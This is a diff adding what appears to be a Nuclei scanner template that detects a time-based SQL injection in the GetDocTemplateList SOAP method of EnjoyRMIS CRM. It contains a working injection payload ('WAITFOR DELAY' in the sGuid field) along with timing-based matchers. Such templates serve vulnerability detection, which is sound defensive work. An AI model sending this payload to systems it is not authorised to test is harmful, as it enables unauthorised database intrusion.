@@ -1,0 +1,46 @@
+id: enjoyrmis-getdoctemplatelist-sqli
+info:
+  name: EnjoyRMIS GetDocTemplateList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in the GetDocTemplateList function of EnjoyRMIS CRM, exploitable via a crafted SOAP request.
+
+variables:
+  t1: "{{rand_int(3,8)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /enjoyRMIS_WS/WS/OA/CWSOffice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetDocTemplateList"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetDocTemplateList xmlns="http://tempuri.org/">
+              <sGuid>1';WAITFOR DELAY '0:0:{{t1}}'--</sGuid>
+            </GetDocTemplateList>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GetDocTemplateListResponse"
+          - "name="
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
